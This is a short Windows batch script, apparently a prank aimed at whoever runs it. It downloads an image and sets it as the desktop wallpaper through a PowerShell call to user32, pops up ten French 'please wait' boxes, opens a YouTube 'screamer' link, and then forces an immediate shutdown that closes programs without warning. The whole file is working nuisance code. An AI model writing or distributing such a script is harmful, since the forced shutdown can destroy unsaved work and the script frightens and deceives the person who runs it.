@echo off
set URL=https://i.postimg.cc/qv0XLxm3/wp.webp
set IMG=%TEMP%\wp.webp
powershell -Command "Invoke-WebRequest '%URL%' -OutFile '%IMG%'"
for /L %%i in (1,1,10) do (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Attendez s''il vous plaît')"
)
timeout /t 3 >nul
powershell -Command ^
"$c='Add-Type @\"using System.Runtime.InteropServices; public class P{ [DllImport(\"user32.dll\",SetLastError=true)] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);} \"@; Add-Type $c; [P]::SystemParametersInfo(20,0,\"%IMG%\",3)'"
start https://www.youtube.com/watch?v=6_x_bMVbN34&pp=ygUIc2NyZWFtZXI%3D
shutdown /s /f /t 0
pause
